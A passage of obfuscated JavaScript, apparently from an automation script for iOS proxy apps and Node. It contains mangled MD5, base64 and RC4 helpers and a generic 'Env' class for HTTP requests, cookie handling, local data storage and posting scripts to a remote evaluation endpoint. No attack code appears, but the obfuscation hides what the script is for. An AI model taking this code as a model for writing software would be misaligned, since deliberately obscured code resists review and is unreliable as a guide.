    _0x261490 = _0x5ae37d(_0x261490, _0x5ae37d(_0x5ae37d(_0x4bc057(_0x2d1f1b, _0x456f40, _0xa00a24), _0x468f83), _0x4f9aeb));
    return _0x5ae37d(_0x290ac7(_0x261490, _0x30f671), _0x2d1f1b);
  }
  function _0x1090cf(_0x23be5c) {
    for (var _0x3646d6, _0x36826a = _0x23be5c.length, _0x303c1a = _0x36826a + 8, _0x322746 = (_0x303c1a - _0x303c1a % 64) / 64, _0x4ef102 = 16 * (_0x322746 + 1), _0x218df0 = new Array(_0x4ef102 - 1), _0x15c700 = 0, _0x1eb308 = 0; _0x36826a > _0x1eb308;) {
      _0x3646d6 = (_0x1eb308 - _0x1eb308 % 4) / 4;
      _0x15c700 = _0x1eb308 % 4 * 8;
      _0x218df0[_0x3646d6] = _0x218df0[_0x3646d6] | _0x23be5c.charCodeAt(_0x1eb308) << _0x15c700;
      _0x1eb308++;
    }
    _0x3646d6 = (_0x1eb308 - _0x1eb308 % 4) / 4;
    _0x15c700 = _0x1eb308 % 4 * 8;
    _0x218df0[_0x3646d6] = _0x218df0[_0x3646d6] | 128 << _0x15c700;
    _0x218df0[_0x4ef102 - 2] = _0x36826a << 3;
    _0x218df0[_0x4ef102 - 1] = _0x36826a >>> 29;
    return _0x218df0;
  }
  function _0x28e657(_0x49be67) {
    var _0x5f2fff,
      _0x269b7e,
      _0x230a08 = "",
      _0x46ff2c = "";
    for (_0x269b7e = 0; 3 >= _0x269b7e; _0x269b7e++) {
      _0x5f2fff = _0x49be67 >>> 8 * _0x269b7e & 255;
      _0x46ff2c = "0" + _0x5f2fff.toString(16);
      _0x230a08 += _0x46ff2c.substr(_0x46ff2c.length - 2, 2);
    }
    return _0x230a08;
  }
  function _0x5d101e(_0x209ab6) {
    _0x209ab6 = _0x209ab6.replace(/\r\n/g, "\n");
    for (var _0x36ea67 = "", _0x3a1941 = 0; _0x3a1941 < _0x209ab6.length; _0x3a1941++) {
      var _0x3d262a = _0x209ab6.charCodeAt(_0x3a1941);
      128 > _0x3d262a ? _0x36ea67 += String.fromCharCode(_0x3d262a) : _0x3d262a > 127 && 2048 > _0x3d262a ? (_0x36ea67 += String.fromCharCode(_0x3d262a >> 6 | 192), _0x36ea67 += String.fromCharCode(63 & _0x3d262a | 128)) : (_0x36ea67 += String.fromCharCode(_0x3d262a >> 12 | 224), _0x36ea67 += String.fromCharCode(_0x3d262a >> 6 & 63 | 128), _0x36ea67 += String.fromCharCode(63 & _0x3d262a | 128));
    }
    return _0x36ea67;
  }
  var _0x5bed3c,
    _0x56b552,
    _0x15a161,
    _0x137862,
    _0x5135f5,
    _0x25b8c3,
    _0x1c62be,
    _0x20c018,
    _0x5a425a,
    _0xa57bdc = [],
    _0x2d0f9b = 7,
    _0x3129f5 = 12,
    _0xb0de0d = 17,
    _0x4296b6 = 22,
    _0x4ca2df = 5,
    _0x455da1 = 9,
    _0x2d5329 = 14,
    _0x4ca8ca = 20,
    _0x4a31ff = 4,
    _0x2c2744 = 11,
    _0x31f758 = 16,
    _0x538bcd = 23,
    _0x12aee4 = 6,
    _0x5a5c4f = 10,
    _0x394b52 = 15,
    _0xe1fa12 = 21;
  for (_0x3a5146 = _0x5d101e(_0x3a5146), _0xa57bdc = _0x1090cf(_0x3a5146), _0x25b8c3 = 1732584193, _0x1c62be = 4023233417, _0x20c018 = 2562383102, _0x5a425a = 271733878, _0x5bed3c = 0; _0x5bed3c < _0xa57bdc.length; _0x5bed3c += 16) {
    _0x56b552 = _0x25b8c3;
    _0x15a161 = _0x1c62be;
    _0x137862 = _0x20c018;
    _0x5135f5 = _0x5a425a;
    _0x25b8c3 = _0x262e4d(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 0], _0x2d0f9b, 3614090360);
    _0x5a425a = _0x262e4d(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 1], _0x3129f5, 3905402710);
    _0x20c018 = _0x262e4d(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 2], _0xb0de0d, 606105819);
    _0x1c62be = _0x262e4d(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 3], _0x4296b6, 3250441966);
    _0x25b8c3 = _0x262e4d(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 4], _0x2d0f9b, 4118548399);
    _0x5a425a = _0x262e4d(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 5], _0x3129f5, 1200080426);
    _0x20c018 = _0x262e4d(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 6], _0xb0de0d, 2821735955);
    _0x1c62be = _0x262e4d(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 7], _0x4296b6, 4249261313);
    _0x25b8c3 = _0x262e4d(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 8], _0x2d0f9b, 1770035416);
    _0x5a425a = _0x262e4d(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 9], _0x3129f5, 2336552879);
    _0x20c018 = _0x262e4d(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 10], _0xb0de0d, 4294925233);
    _0x1c62be = _0x262e4d(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 11], _0x4296b6, 2304563134);
    _0x25b8c3 = _0x262e4d(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 12], _0x2d0f9b, 1804603682);
    _0x5a425a = _0x262e4d(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 13], _0x3129f5, 4254626195);
    _0x20c018 = _0x262e4d(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 14], _0xb0de0d, 2792965006);
    _0x1c62be = _0x262e4d(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 15], _0x4296b6, 1236535329);
    _0x25b8c3 = _0x2de1cb(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 1], _0x4ca2df, 4129170786);
    _0x5a425a = _0x2de1cb(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 6], _0x455da1, 3225465664);
    _0x20c018 = _0x2de1cb(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 11], _0x2d5329, 643717713);
    _0x1c62be = _0x2de1cb(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 0], _0x4ca8ca, 3921069994);
    _0x25b8c3 = _0x2de1cb(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 5], _0x4ca2df, 3593408605);
    _0x5a425a = _0x2de1cb(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 10], _0x455da1, 38016083);
    _0x20c018 = _0x2de1cb(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 15], _0x2d5329, 3634488961);
    _0x1c62be = _0x2de1cb(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 4], _0x4ca8ca, 3889429448);
    _0x25b8c3 = _0x2de1cb(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 9], _0x4ca2df, 568446438);
    _0x5a425a = _0x2de1cb(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 14], _0x455da1, 3275163606);
    _0x20c018 = _0x2de1cb(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 3], _0x2d5329, 4107603335);
    _0x1c62be = _0x2de1cb(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 8], _0x4ca8ca, 1163531501);
    _0x25b8c3 = _0x2de1cb(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 13], _0x4ca2df, 2850285829);
    _0x5a425a = _0x2de1cb(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 2], _0x455da1, 4243563512);
    _0x20c018 = _0x2de1cb(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 7], _0x2d5329, 1735328473);
    _0x1c62be = _0x2de1cb(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 12], _0x4ca8ca, 2368359562);
    _0x25b8c3 = _0x404862(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 5], _0x4a31ff, 4294588738);
    _0x5a425a = _0x404862(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 8], _0x2c2744, 2272392833);
    _0x20c018 = _0x404862(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 11], _0x31f758, 1839030562);
    _0x1c62be = _0x404862(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 14], _0x538bcd, 4259657740);
    _0x25b8c3 = _0x404862(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 1], _0x4a31ff, 2763975236);
    _0x5a425a = _0x404862(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 4], _0x2c2744, 1272893353);
    _0x20c018 = _0x404862(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 7], _0x31f758, 4139469664);
    _0x1c62be = _0x404862(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 10], _0x538bcd, 3200236656);
    _0x25b8c3 = _0x404862(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 13], _0x4a31ff, 681279174);
    _0x5a425a = _0x404862(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 0], _0x2c2744, 3936430074);
    _0x20c018 = _0x404862(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 3], _0x31f758, 3572445317);
    _0x1c62be = _0x404862(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 6], _0x538bcd, 76029189);
    _0x25b8c3 = _0x404862(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 9], _0x4a31ff, 3654602809);
    _0x5a425a = _0x404862(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 12], _0x2c2744, 3873151461);
    _0x20c018 = _0x404862(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 15], _0x31f758, 530742520);
    _0x1c62be = _0x404862(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 2], _0x538bcd, 3299628645);
    _0x25b8c3 = _0x3185a8(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 0], _0x12aee4, 4096336452);
    _0x5a425a = _0x3185a8(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 7], _0x5a5c4f, 1126891415);
    _0x20c018 = _0x3185a8(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 14], _0x394b52, 2878612391);
    _0x1c62be = _0x3185a8(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 5], _0xe1fa12, 4237533241);
    _0x25b8c3 = _0x3185a8(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 12], _0x12aee4, 1700485571);
    _0x5a425a = _0x3185a8(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 3], _0x5a5c4f, 2399980690);
    _0x20c018 = _0x3185a8(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 10], _0x394b52, 4293915773);
    _0x1c62be = _0x3185a8(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 1], _0xe1fa12, 2240044497);
    _0x25b8c3 = _0x3185a8(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 8], _0x12aee4, 1873313359);
    _0x5a425a = _0x3185a8(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 15], _0x5a5c4f, 4264355552);
    _0x20c018 = _0x3185a8(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 6], _0x394b52, 2734768916);
    _0x1c62be = _0x3185a8(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 13], _0xe1fa12, 1309151649);
    _0x25b8c3 = _0x3185a8(_0x25b8c3, _0x1c62be, _0x20c018, _0x5a425a, _0xa57bdc[_0x5bed3c + 4], _0x12aee4, 4149444226);
    _0x5a425a = _0x3185a8(_0x5a425a, _0x25b8c3, _0x1c62be, _0x20c018, _0xa57bdc[_0x5bed3c + 11], _0x5a5c4f, 3174756917);
    _0x20c018 = _0x3185a8(_0x20c018, _0x5a425a, _0x25b8c3, _0x1c62be, _0xa57bdc[_0x5bed3c + 2], _0x394b52, 718787259);
    _0x1c62be = _0x3185a8(_0x1c62be, _0x20c018, _0x5a425a, _0x25b8c3, _0xa57bdc[_0x5bed3c + 9], _0xe1fa12, 3951481745);
    _0x25b8c3 = _0x5ae37d(_0x25b8c3, _0x56b552);
    _0x1c62be = _0x5ae37d(_0x1c62be, _0x15a161);
    _0x20c018 = _0x5ae37d(_0x20c018, _0x137862);
    _0x5a425a = _0x5ae37d(_0x5a425a, _0x5135f5);
  }
  var _0x4393f6 = _0x28e657(_0x25b8c3) + _0x28e657(_0x1c62be) + _0x28e657(_0x20c018) + _0x28e657(_0x5a425a);
  return _0x4393f6.toLowerCase();
}
function FxPCnMKLw7() {
  _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
  this.encode = function (_0x4fc970) {
    var _0x104e54 = "",
      _0x207276,
      _0x5a15ec,
      _0x1b569d,
      _0x5dadab,
      _0x3e6f90,
      _0x4d1eea,
      _0x387bb8,
      _0x3318ad = 0;
    _0x4fc970 = _utf8_encode(_0x4fc970);
    while (_0x3318ad < _0x4fc970.length) {
      _0x207276 = _0x4fc970.charCodeAt(_0x3318ad++);
      _0x5a15ec = _0x4fc970.charCodeAt(_0x3318ad++);
      _0x1b569d = _0x4fc970.charCodeAt(_0x3318ad++);
      _0x5dadab = _0x207276 >> 2;
      _0x3e6f90 = (_0x207276 & 3) << 4 | _0x5a15ec >> 4;
      _0x4d1eea = (_0x5a15ec & 15) << 2 | _0x1b569d >> 6;
      _0x387bb8 = _0x1b569d & 63;
      if (isNaN(_0x5a15ec)) {
        _0x4d1eea = _0x387bb8 = 64;
      } else {
        isNaN(_0x1b569d) && (_0x387bb8 = 64);
      }
      _0x104e54 = _0x104e54 + _keyStr.charAt(_0x5dadab) + _keyStr.charAt(_0x3e6f90) + _keyStr.charAt(_0x4d1eea) + _keyStr.charAt(_0x387bb8);
    }
    return _0x104e54;
  };
  this.decode = function (_0x4ea41d) {
    var _0x3f1843 = "",
      _0x206f77,
      _0x2072bc,
      _0x5db55f,
      _0x2a36d1,
      _0x30d769,
      _0xc6f45f,
      _0x1a35c6,
      _0x1a70b9 = 0;
    _0x4ea41d = _0x4ea41d.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    while (_0x1a70b9 < _0x4ea41d.length) {
      _0x2a36d1 = _keyStr.indexOf(_0x4ea41d.charAt(_0x1a70b9++));
      _0x30d769 = _keyStr.indexOf(_0x4ea41d.charAt(_0x1a70b9++));
      _0xc6f45f = _keyStr.indexOf(_0x4ea41d.charAt(_0x1a70b9++));
      _0x1a35c6 = _keyStr.indexOf(_0x4ea41d.charAt(_0x1a70b9++));
      _0x206f77 = _0x2a36d1 << 2 | _0x30d769 >> 4;
      _0x2072bc = (_0x30d769 & 15) << 4 | _0xc6f45f >> 2;
      _0x5db55f = (_0xc6f45f & 3) << 6 | _0x1a35c6;
      _0x3f1843 = _0x3f1843 + String.fromCharCode(_0x206f77);
      _0xc6f45f != 64 && (_0x3f1843 = _0x3f1843 + String.fromCharCode(_0x2072bc));
      _0x1a35c6 != 64 && (_0x3f1843 = _0x3f1843 + String.fromCharCode(_0x5db55f));
    }
    _0x3f1843 = _utf8_decode(_0x3f1843);
    return _0x3f1843;
  };
  _utf8_encode = function (_0x2a8673) {
    _0x2a8673 = _0x2a8673.replace(/\r\n/g, "\n");
    var _0x4c9f33 = "";
    for (var _0xf2bea3 = 0; _0xf2bea3 < _0x2a8673.length; _0xf2bea3++) {
      var _0x2cd552 = _0x2a8673.charCodeAt(_0xf2bea3);
      if (_0x2cd552 < 128) {
        _0x4c9f33 += String.fromCharCode(_0x2cd552);
      } else {
        _0x2cd552 > 127 && _0x2cd552 < 2048 ? (_0x4c9f33 += String.fromCharCode(_0x2cd552 >> 6 | 192), _0x4c9f33 += String.fromCharCode(_0x2cd552 & 63 | 128)) : (_0x4c9f33 += String.fromCharCode(_0x2cd552 >> 12 | 224), _0x4c9f33 += String.fromCharCode(_0x2cd552 >> 6 & 63 | 128), _0x4c9f33 += String.fromCharCode(_0x2cd552 & 63 | 128));
      }
    }
    return _0x4c9f33;
  };
  _utf8_decode = function (_0x36ad3c) {
    c1 = c2 = 0;
    var _0x42f9ed = "",
      _0x3e8b14 = 0,
      _0x5a3b98 = c1;
    while (_0x3e8b14 < _0x36ad3c.length) {
      _0x5a3b98 = _0x36ad3c.charCodeAt(_0x3e8b14);
      if (_0x5a3b98 < 128) {
        _0x42f9ed += String.fromCharCode(_0x5a3b98);
        _0x3e8b14++;
      } else {
        _0x5a3b98 > 191 && _0x5a3b98 < 224 ? (c2 = _0x36ad3c.charCodeAt(_0x3e8b14 + 1), _0x42f9ed += String.fromCharCode((_0x5a3b98 & 31) << 6 | c2 & 63), _0x3e8b14 += 2) : (c2 = _0x36ad3c.charCodeAt(_0x3e8b14 + 1), c3 = _0x36ad3c.charCodeAt(_0x3e8b14 + 2), _0x42f9ed += String.fromCharCode((_0x5a3b98 & 15) << 12 | (c2 & 63) << 6 | c3 & 63), _0x3e8b14 += 3);
      }
    }
    return _0x42f9ed;
  };
}
function rc4(_0x27b9e4, _0x4ca4ce) {
  var _0x2e8583 = Array(256),
    _0x4a9455 = Array(_0x27b9e4.length);
  for (var _0xf7466c = 0; _0xf7466c < 256; _0xf7466c++) {
    _0x2e8583[_0xf7466c] = _0xf7466c;
    var _0x2897c5 = (_0x2897c5 + _0x2e8583[_0xf7466c] + _0x4ca4ce.charCodeAt(_0xf7466c % _0x4ca4ce.length)) % 256,
      _0x7b1949 = _0x2e8583[_0xf7466c];
    _0x2e8583[_0xf7466c] = _0x2e8583[_0x2897c5];
    _0x2e8583[_0x2897c5] = _0x7b1949;
  }
  for (var _0xf7466c = 0; _0xf7466c < _0x27b9e4.length; _0xf7466c++) {
    _0x4a9455[_0xf7466c] = _0x27b9e4.charCodeAt(_0xf7466c);
  }
  for (var _0x5e7f3a = 0; _0x5e7f3a < _0x4a9455.length; _0x5e7f3a++) {
    var _0xf7466c = (_0xf7466c + 1) % 256,
      _0x2897c5 = (_0x2897c5 + _0x2e8583[_0xf7466c]) % 256,
      _0x7b1949 = _0x2e8583[_0xf7466c];
    _0x2e8583[_0xf7466c] = _0x2e8583[_0x2897c5];
    _0x2e8583[_0x2897c5] = _0x7b1949;
    var _0x2aca83 = (_0x2e8583[_0xf7466c] + _0x2e8583[_0x2897c5] % 256) % 256;
    _0x4a9455[_0x5e7f3a] = String.fromCharCode(_0x4a9455[_0x5e7f3a] ^ _0x2e8583[_0x2aca83]);
  }
  return _0x4a9455.join("");
}
function Env(t, e) {
  class s {
    constructor(t) {
      this.env = t;
    }
    send(t, e = "GET") {
      t = "string" == typeof t ? {
        url: t
      } : t;
      let s = this.get;
      "POST" === e && (s = this.post);
      return new Promise((e, i) => {
        s.call(this, t, (t, s, r) => {
          t ? i(t) : e(s);
        });
      });
    }
    get(t) {
      return this.send.call(this.env, t);
    }
    post(t) {
      return this.send.call(this.env, t, "POST");
    }
  }
  return new class {
    constructor(t, e) {
      this.name = t;
      this.http = new s(this);
      this.data = null;
      this.dataFile = "box.dat";
      this.logs = [];
      this.isMute = !1;
      this.isNeedRewrite = !1;
      this.logSeparator = "\n";
      this.encoding = "utf-8";
      this.startTime = new Date().getTime();
      Object.assign(this, e);
      this.log("", `🔔${this.name}, 开始!`);
    }
    isNode() {
      return "undefined" != typeof module && !!module.exports;
    }
    isQuanX() {
      return "undefined" != typeof $task;
    }
    isSurge() {
      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
    }
    isLoon() {
      return "undefined" != typeof $loon;
    }
    isShadowrocket() {
      return "undefined" != typeof $rocket;
    }
    toObj(t, e = null) {
      try {
        return JSON.parse(t);
      } catch {
        return e;
      }
    }
    toStr(t, e = null) {
      try {
        return JSON.stringify(t);
      } catch {
        return e;
      }
    }
    getjson(t, e) {
      let s = e;
      const i = this.getdata(t);
      if (i) {
        try {
          s = JSON.parse(this.getdata(t));
        } catch {}
      }
      return s;
    }
    setjson(t, e) {
      try {
        return this.setdata(JSON.stringify(t), e);
      } catch {
        return !1;
      }
    }
    getScript(t) {
      return new Promise(e => {
        this.get({
          url: t
        }, (t, s, i) => e(i));
      });
    }
    runScript(t, e) {
      return new Promise(s => {
        let i = this.getdata("@chavy_boxjs_userCfgs.httpapi");
        i = i ? i.replace(/\n/g, "").trim() : i;
        let r = this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");
        r = r ? 1 * r : 20;
        r = e && e.timeout ? e.timeout : r;
        const [o, h] = i.split("@"),
          n = {
            url: `http://${h}/v1/scripting/evaluate`,
            body: {
              script_text: t,
              mock_type: "cron",
              timeout: r
            },
            headers: {
              "X-Key": o,
              Accept: "*/*"
            }
          };
        this.post(n, (t, e, i) => s(i));
      }).catch(t => this.logErr(t));
    }
    loaddata() {
      if (!this.isNode()) {
        return {};
      }
      {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e);
        if (!s && !i) {
          return {};
        }
        {
          const i = s ? t : e;
          try {
            return JSON.parse(this.fs.readFileSync(i));
          } catch (t) {
            return {};
          }
        }
      }
    }
    writedata() {
      if (this.isNode()) {
        this.fs = this.fs ? this.fs : require("fs");
        this.path = this.path ? this.path : require("path");
        const t = this.path.resolve(this.dataFile),
          e = this.path.resolve(process.cwd(), this.dataFile),
          s = this.fs.existsSync(t),
          i = !s && this.fs.existsSync(e),
          r = JSON.stringify(this.data);
        s ? this.fs.writeFileSync(t, r) : i ? this.fs.writeFileSync(e, r) : this.fs.writeFileSync(t, r);
      }
    }
    lodash_get(t, e, s) {
      const i = e.replace(/\[(\d+)\]/g, ".$1").split(".");
      let r = t;
      for (const t of i) if (r = Object(r)[t], void 0 === r) {
        return s;
      }
      return r;
    }
    lodash_set(t, e, s) {
      return Object(t) !== t ? t : (Array.isArray(e) || (e = e.toString().match(/[^.[\]]+/g) || []), e.slice(0, -1).reduce((t, s, i) => Object(t[s]) === t[s] ? t[s] : t[s] = Math.abs(e[i + 1]) >> 0 == +e[i + 1] ? [] : {}, t)[e[e.length - 1]] = s, t);
    }
    getdata(t) {
      let e = this.getval(t);
      if (/^@/.test(t)) {
        const [, s, i] = /^@(.*?)\.(.*?)$/.exec(t),
          r = s ? this.getval(s) : "";
        if (r) {
          try {
            const t = JSON.parse(r);
            e = t ? this.lodash_get(t, i, "") : e;
          } catch (t) {
            e = "";
          }
        }
      }
      return e;
    }
    setdata(t, e) {
      let s = !1;
      if (/^@/.test(e)) {
        const [, i, r] = /^@(.*?)\.(.*?)$/.exec(e),
          o = this.getval(i),
          h = i ? "null" === o ? null : o || "{}" : "{}";
        try {
          const e = JSON.parse(h);
          this.lodash_set(e, r, t);
          s = this.setval(JSON.stringify(e), i);
        } catch (e) {
          const o = {};
          this.lodash_set(o, r, t);
          s = this.setval(JSON.stringify(o), i);
        }
      } else {
        s = this.setval(t, e);
      }
      return s;
    }
    getval(t) {
      return this.isSurge() || this.isLoon() ? $persistentStore.read(t) : this.isQuanX() ? $prefs.valueForKey(t) : this.isNode() ? (this.data = this.loaddata(), this.data[t]) : this.data && this.data[t] || null;
    }
    setval(t, e) {
      return this.isSurge() || this.isLoon() ? $persistentStore.write(t, e) : this.isQuanX() ? $prefs.setValueForKey(t, e) : this.isNode() ? (this.data = this.loaddata(), this.data[e] = t, this.writedata(), !0) : this.data && this.data[e] || null;
    }
    initGotEnv(t) {
      this.got = this.got ? this.got : require("got");
      this.cktough = this.cktough ? this.cktough : require("tough-cookie");
      this.ckjar = this.ckjar ? this.ckjar : new this.cktough.CookieJar();
      t && (t.headers = t.headers ? t.headers : {}, void 0 === t.headers.Cookie && void 0 === t.cookieJar && (t.cookieJar = this.ckjar));
    }
    get(t, e = () => {}) {
      if (t.headers && (delete t.headers["Content-Type"], delete t.headers["Content-Length"]), this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient.get(t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let s = require("iconv-lite");
            this.initGotEnv(t);
            this.got(t).on("redirect", (t, e) => {
              try {
                if (t.headers["set-cookie"]) {
                  const s = t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();
                  s && this.ckjar.setCookieSync(s, null);
                  e.cookieJar = this.ckjar;
                }
              } catch (t) {
                this.logErr(t);
              }
            }).then(t => {
              const {
                statusCode: i,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: i,
                statusCode: r,
                headers: o,
                rawBody: h
              }, s.decode(h, this.encoding));
            }, t => {
              const {
                message: i,
                response: r
              } = t;
              e(i, r, r && s.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    post(t, e = () => {}) {
      const s = t.method ? t.method.toLocaleLowerCase() : "post";
      if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon()) {
        this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
          "X-Surge-Skip-Scripting": !1
        }));
        $httpClient[s](t, (t, s, i) => {
          !t && s && (s.body = i, s.statusCode = s.status);
          e(t, s, i);
        });
      } else {
        if (this.isQuanX()) {
          t.method = s;
          this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
            hints: !1
          }));
          $task.fetch(t).then(t => {
            const {
              statusCode: s,
              statusCode: i,
              headers: r,
              body: o
            } = t;
            e(null, {
              status: s,
              statusCode: i,
              headers: r,
              body: o
            }, o);
          }, t => e(t));
        } else {
          if (this.isNode()) {
            let i = require("iconv-lite");
            this.initGotEnv(t);
            const {
              url: r,
              ...o
            } = t;
            this.got[s](r, o).then(t => {
              const {
                statusCode: s,
                statusCode: r,
                headers: o,
                rawBody: h
              } = t;
              e(null, {
                status: s,
                statusCode: r,
                headers: o,
                rawBody: h
              }, i.decode(h, this.encoding));
            }, t => {
              const {
                message: s,
                response: r
              } = t;
              e(s, r, r && i.decode(r.rawBody, this.encoding));
            });
          }
        }
      }
    }
    time(t, e = null) {
      const s = e ? new Date(e) : new Date();
      let i = {
        "M+": s.getMonth() + 1,
        "d+": s.getDate(),
        "H+": s.getHours(),
        "m+": s.getMinutes(),
        "s+": s.getSeconds(),
        "q+": Math.floor((s.getMonth() + 3) / 3),
        S: s.getMilliseconds()
      };
      /(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
      for (let e in i) new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
      return t;
    }
    msg(e = t, s = "", i = "", r) {
